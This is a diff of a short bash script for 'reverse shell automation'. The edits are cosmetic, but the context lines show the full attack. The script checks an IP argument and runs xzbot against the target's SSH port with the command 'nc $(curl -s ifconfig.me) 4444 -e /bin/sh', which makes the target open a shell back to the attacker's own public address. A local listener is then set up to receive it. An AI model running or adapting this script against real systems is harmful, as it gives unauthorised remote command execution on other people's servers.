@@ -1,7 +1,10 @@
 #!/bin/bash
 
-argument_count="${#}"
-target_address="${1}"
+# Naming arguments
+argument_count=${#}
+target_address=${1}
+
+# Set IP regex
 ip_pattern="^([0-9]{1,3}\.){3}[0-9]{1,3}$"
 
 # Check argument
@@ -19,7 +22,7 @@ fi
 echo "[+] Starting reverse shell automation"
 
 # Send nc command to establish reverse shell
-echo "[+] Send request to localhost from ${target_address} after 1 second"
+echo "[+] Send request to localhost from ${1} after 1 second"
 sleep 1 && xzbot -addr ${target_address}:22 -cmd "nc $(curl -s ifconfig.me) 4444 -e /bin/sh" > /dev/null 2>&1 &
 
 # Set localhost as a listener
